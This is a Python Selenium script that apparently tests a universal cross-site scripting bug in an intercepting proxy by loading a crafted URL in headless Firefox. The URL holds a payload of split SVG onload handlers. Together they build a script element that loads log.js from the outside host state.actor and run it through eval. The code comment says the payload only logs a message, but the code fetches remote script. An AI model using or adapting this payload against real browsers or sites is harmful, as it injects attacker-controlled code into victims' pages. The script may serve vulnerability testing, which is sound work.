#!/usr/bin/env python3

from selenium import webdriver
from base64 import b64encode
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
import os
import sys

# Browse to exploit URL via proxy to validate that UXSS proxy bug is working

# This payload will console.log("xss works")
url ="""
http://www.example.com/ooops/d35fs23hu73
ds/blocked.html?abcdeaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s='a=document.createElement'">
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='(\\'script\\'); a.src=\\'';">
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='//state.actor/log.js\\'' ">
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='; document.body'">bbbbbbbb
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='.appendChild(a);'">bbbbbbb
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="eval(s)" ></svg>
""".replace("\n","")

os.environ['MOZ_HEADLESS'] = '1'
binary = FirefoxBinary('/usr/bin/firefox', log_file=sys.stdout)
myProxy = "127.0.0.1:7239"
def ff_proxy(PROXY_HOST,PROXY_PORT, b):
        fp = webdriver.FirefoxProfile()
        fp.set_preference("network.proxy.type", 1)
        fp.set_preference("network.proxy.http",PROXY_HOST)
        fp.set_preference("network.proxy.http_port",PROXY_PORT)
        fp.set_preference("network.proxy.ssl",PROXY_HOST)
        fp.set_preference("network.proxy.ssl_port",PROXY_PORT)
        fp.update_preferences()
        return webdriver.Firefox(firefox_profile=fp, firefox_binary=b)
driver = ff_proxy("127.0.0.1", 7239, binary)

from selenium.common.exceptions import TimeoutException, NoSuchElementException
try:
    driver.get(url)
    driver.implicitly_wait(5)
    driver.find_element_by_id("xss")
    print("Success. UXSS ran")

    print("Load example...")
    driver.get("http://example.com")
    driver.implicitly_wait(5)
    print(driver.page_source)



    sys.exit(0)
except NoSuchElementException:
    print("Failure. xss element missing- UXSS didn't run?")
    sys.exit(1)
except Exception as e:
    print("General failure")
    raise e
finally:
    driver.quit()

# Won't get here on successes
sys.exit(1)
